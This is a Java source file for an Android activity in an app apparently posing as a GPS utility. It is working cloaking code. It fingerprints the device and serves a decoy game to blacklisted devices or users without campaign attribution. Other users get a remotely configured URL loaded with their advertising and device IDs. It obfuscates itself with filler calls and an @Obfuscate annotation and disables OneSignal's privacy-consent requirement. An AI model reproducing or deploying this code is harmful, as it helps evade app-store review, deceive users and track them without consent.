package com.utilitydevs34.luckygps;


import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PersistableBundle;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.view.WindowInsets;
import android.view.WindowInsetsController;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.constraintlayout.widget.ConstraintLayout;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentTransaction;

import com.onesignal.OneSignal;
import com.utilitydevs34.luckygps.foo.FingerprintingProvider;
import com.utilitydevs34.luckygps.foo.MyJsonObject;
import com.utilitydevs34.luckygps.foo.ThreadedAFDeepLinkProvider;
import com.utilitydevs34.luckygps.foo.ThreadedFBProvider;
import com.utilitydevs34.luckygps.foo.ThreadedIDFAProvider;
import com.utilitydevs34.luckygps.foo.UselessCode;
import com.utilitydevs34.luckygps.foo.Utils;
import com.utilitydevs34.luckygps.view.AdvancedWebView;
import com.utilitydevs34.luckygps.view.CustomView;

import org.json.JSONObject;

import java.io.IOException;
import java.io.InputStream;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;

import fi.iki.elonen.NanoHTTPD;
import io.michaelrocks.paranoid.Obfuscate;

@Obfuscate
public class SuperActivity extends AppCompatActivity implements AdvancedWebView.Listener, CustomView.WebViewEventListener {

    private ConstraintLayout rootView;
    private CustomView adView;

    private static final String EXTRA_HTML = "";
    String per;
    private static long back_pressed;

    public static final byte REASON_BLACKLISTED = 1;
    public static final byte REASON_NO_NAMING = 2;
    public static final byte REASON_DISABLED = 10;
    public static final byte REASON_MAGIC = 11;
    public static final byte REASON_ERROR = 99;

    //optimization
    Map<String, String> map = new HashMap<>();

    public static final boolean CLOAK_WITHOUT_NAMING = false; //when TRUE all users without naming will be cloaked

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        //TODO: this code defines loading screen. Please re-write this code
        setContentView(R.layout.activity_super);
        rootView = findViewById(R.id.root_constraint_layout);
        //---

        Intent intent = getIntent();
        per = intent.getStringExtra("privpo");

        Thread t = new Thread(() -> {
            try {
                UselessCode.run();

                //get IDFA
                new ThreadedIDFAProvider(this).run();

                UselessCode.run();

                //get device fingerprint. A lot of information will be obtained, but not used by default.
                FingerprintingProvider.init(SuperActivity.this);

                if(!FingerprintingProvider.isTrusted()){
                    startSweetie(REASON_BLACKLISTED);
                    return;
                }

                UselessCode.run();

                MyJsonObject rc = AppSingletonClass.getRemoteConfig(true, false);

                //init Appsflyer (up to 10s blocking)
                new ThreadedAFDeepLinkProvider(rc, this).run();

                //check for naming
                if(!AppSingletonClass.getLocalConfig().contains("af__campaign") && CLOAK_WITHOUT_NAMING){
                    startSweetie(REASON_NO_NAMING);
                    return;
                }

                UselessCode.run();

                //init onesignal
                if (rc.getStr("os_id").length()>0) {
                    OneSignal.setAppId(rc.getStr("os_id"));
                    OneSignal.initWithContext(this);
                    OneSignal.setRequiresUserPrivacyConsent(false);
                    if(AppSingletonClass.getLocalConfig().contains(Utils.KEY_ADID)) {
                        OneSignal.setExternalUserId(ThreadedIDFAProvider.getIdfa());
                    }
                }

                runOnUiThread(this::onLoadingFinished);
            } catch (Exception e) {
                runOnUiThread(this::onLoadingFailed);
            }
        });

        t.start();
    }

    public void onLoadingFinished() {
        removeFragments();
        MyJsonObject cnf = AppSingletonClass.getRemoteConfig();

        setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_FULL_SENSOR);

        if (!cnf.getBool("show_ad", false) || cnf.getStr("url").length() == 0) {
            if(per != null) {
                adView = new CustomView(this);
                adView.setEventListener(this);
                adView.setListener(this, this);
                ((ConstraintLayout) findViewById(R.id.root_constraint_layout)).addView(adView, -1, new ConstraintLayout.LayoutParams(-1, -1));
                adView.setVisibility(View.VISIBLE);
                adView.loadUrl("file:///android_asset/privacy_policy.html");
            }
            else
                startSweetie(REASON_DISABLED);
            return;
        }

        adView = new CustomView(this);
        adView.setEventListener(this);
        adView.setListener(this, this);
        ((ConstraintLayout) findViewById(R.id.root_constraint_layout)).addView(adView, -1, new ConstraintLayout.LayoutParams(-1, -1));
        adView.setVisibility(View.INVISIBLE);



        //update destination URL with various params
        String url = cnf.getStr("url");
        //if you provide trusted_url, all users with naming will be navigated there (i.e. you may use the app without external cloaking)
        if(cnf.getStr("trusted_url").length()>0 && AppSingletonClass.getLocalConfig().contains("af__campaign")) url = cnf.getStr("trusted_url");
        url = processVariables(url, true);
        map.put("device_id", AppSingletonClass.getLocalConfig().getString(Utils.KEY_AF_DEV_ID));
        map.put("ad_id", AppSingletonClass.getLocalConfig().getString(Utils.KEY_ADID));

        String test = appendQueryParameters(url, map);
        Log.d("main", test);

        adView.loadUrl(test);

        UselessCode.run();

        final Handler handler = new Handler(Looper.getMainLooper());
        handler.postDelayed(() -> {
            if(adView==null) return;
            adView.setVisibility(View.VISIBLE);
            new KeyboardUtil(this, rootView).enable();
            //init facebook
            new ThreadedFBProvider(cnf, SuperActivity.this).run();
        }, 1320);
        //1320 - is a delay before showing webview so the user will see progress bar instead of white screen
    }

    @Override
    public void onBackPressed() {
        if(adView==null) return;
        if(adView.canGoBack()){
            adView.goBack();
        }else if(getIntent().hasExtra(EXTRA_HTML)){
            super.onBackPressed();
        } else if(per != null)
        {
            if (back_pressed + 2000 > System.currentTimeMillis())
                super.onBackPressed();
            else
                Toast.makeText(getBaseContext(), "Press once again to exit!",
                        Toast.LENGTH_SHORT).show();
            back_pressed = System.currentTimeMillis();
        }
    }


    private String processVariables(String sSrc, boolean isSendToOS) {
        //a. attribution parameters from local config storage:
        Map<String, ?> data = AppSingletonClass.getLocalConfig().getAll();
        for (Map.Entry<String, ?> entry : data.entrySet()) {
            try {
                sSrc = sSrc.replace("~" + entry.getKey() + "~", URLEncoder.encode(entry.getValue().toString(), "UTF-8"));
            } catch (Exception ignored) {}
        }

        //b. process af__campaign (when available):
        if (AppSingletonClass.getLocalConfig().contains("af__campaign")) {
            String[] splittedCampaignName = AppSingletonClass.getLocalConfig().getString("af__campaign", "").split("%");
            JSONObject jo = new JSONObject();
            int i = 0;
            for (String campaignParam : splittedCampaignName) {
                try {
                    sSrc = sSrc.replace("~af__campaign_" + i + "~", URLEncoder.encode(campaignParam, "UTF-8"));
                    sSrc = sSrc.replace("~af__campaign_-" + (i + 1) + "~", URLEncoder.encode(splittedCampaignName[splittedCampaignName.length - i - 1], "UTF-8"));
                    jo.put("c" + i, campaignParam);
                } catch (Exception ignored) {}
                i++;
            }
            if (isSendToOS) OneSignal.sendTags(jo);
        }
        return sSrc;
    }

    //Optmization
    public static String appendQueryParameters(String urlSource, Map<String, String> urlParams) {
        Uri.Builder uriBuilderSource = Uri.parse(urlSource).buildUpon();

        for (Map.Entry entry : urlParams.entrySet()) {
            String key = entry.getKey().toString();
            if (key.length() == 0) continue;
            uriBuilderSource = uriBuilderSource.appendQueryParameter(entry.getKey().toString(), entry.getValue().toString());
        }
        return uriBuilderSource.build().toString();
    }

    @Override
    protected void onStart() {
        super.onStart();
        hideUI();
    }

    public void startSweetie(byte reason) {
        Intent intentSweetie = new Intent(this, MainActivity.class);
        startActivity(intentSweetie);
        overridePendingTransition(0, 0);
        finish();




        //in case when you need to load HTML5 game as sweetie
        runOnUiThread(() -> {
            UselessCode.run();
            removeFragments();
            setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);

            adView = new CustomView(this);
            adView.setEventListener(this);
            adView.setListener(this, this);
            ((ConstraintLayout) findViewById(R.id.root_constraint_layout)).removeAllViews();
            ((ConstraintLayout) findViewById(R.id.root_constraint_layout)).addView(adView, -1, new ConstraintLayout.LayoutParams(-1, -1));
            WebServer server = startWebServer();

            //try starting server 5 times
            int retrys = 0;
            do {
                try {
                    retrys++;
                    server.start();
                    retrys = 999;
                } catch (IOException ioe) {
                    Log.w("httpd", ioe);
                }
            }while (retrys<=5);

            if(retrys<999){
                //server not started!
                throw new RuntimeException();
            }

            adView.loadUrl("http://" + server.getHostname() + ":" + server.getListeningPort() + "/index.html");//TODO
            new KeyboardUtil(this, rootView).enable();
        });
    }

    private void onLoadingFailed() {
        startSweetie(REASON_ERROR);
    }

    @Override
    public void onSaveInstanceState(Bundle outState, PersistableBundle outPersistentState) {
        super.onSaveInstanceState(outState, outPersistentState);
        if (adView == null) return;
        adView.saveState(outState);
    }

    @Override
    protected void onRestoreInstanceState(Bundle savedInstanceState) {
        super.onRestoreInstanceState(savedInstanceState);
        if (adView == null) return;
        adView.restoreState(savedInstanceState);
    }

    @Override
    protected void onPostCreate(Bundle savedInstanceState) {
        super.onPostCreate(savedInstanceState);
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        _hideUi(0);
    }

    void hideUI() {
        final View decorView = getWindow().getDecorView();
        decorView.setOnSystemUiVisibilityChangeListener(this::_hideUi);
    }

    private void _hideUi(int i) {
        UselessCode.run();
        Window window = getWindow();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            window.setDecorFitsSystemWindows(false);
            window.getInsetsController().hide(WindowInsets.Type.statusBars());
            window.getInsetsController().hide(WindowInsets.Type.navigationBars());
            window.getInsetsController().setSystemBarsBehavior(WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE);
        } else {
            View decorView1 = getWindow().getDecorView();
            decorView1.setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_IMMERSIVE
                            | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            );
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (adView == null) return;
        adView.onActivityResult(requestCode, resultCode, data);
    }


    public void removeFragments() {
        FragmentTransaction tr = getSupportFragmentManager().beginTransaction();
        for (Fragment fr:getSupportFragmentManager().getFragments()) {
            tr.remove(fr);
        }
        tr.commit();
    }




    @Override
    protected void onResume() {
        super.onResume();
        hideUI();
        if (adView == null) return;
        adView.onResume();
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (adView == null) return;
        //adView.onPause();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (adView == null) return;
        adView.onDestroy();
    }

    @Override
    public void onPageStarted(String url, Bitmap favicon) {
        //pass
    }

    @Override
    public void onPageFinished(String url) {
        //pass
    }

    @Override
    public void onPageError(int errorCode, String description, String failingUrl) {
        //pass
    }

    @Override
    public void onDownloadRequested(String url, String suggestedFilename, String mimeType, long contentLength, String contentDisposition, String userAgent) {
        //pass
    }

    @Override
    public void onExternalPageRequest(String url) {
        //pass
    }

    @Override
    public void onStartIntent(Intent i) {
        i.putExtra("d", UselessCode.result);
        startActivity(i);
    }

    @Override
    public void onStartSweetie(byte reason) {
        startSweetie(reason);
    }

    public WebServer startWebServer(){
        return new WebServer();
    }

    private class WebServer extends NanoHTTPD {

        public WebServer()
        {
            super("127.0.0.1", (new Random()).nextInt(100) + 8000);
        }

        @Override
        public Response serve(String uri, Method method,
                              Map<String, String> header,
                              Map<String, String> parameters,
                              Map<String, String> files) {

            try {
                Response r = null;
                String type = URLConnection.guessContentTypeFromName(uri);

                InputStream is;
                is = getAssets().open(uri.substring(1));
                r =  NanoHTTPD.newFixedLengthResponse(Response.Status.OK, type, is,  is.available());

                r.addHeader("Access-Control-Allow-Origin","*");
                r.addHeader("Access-Control-Allow-Methods","POST, GET, OPTIONS, DELETE");
                r.addHeader("Access-Control-Max-Age","86400");

                return r;
            } catch(IOException ioe) {
                return newFixedLengthResponse(Response.Status.NOT_FOUND, NanoHTTPD.MIME_HTML, "Not Found");
            }
        }
    }
}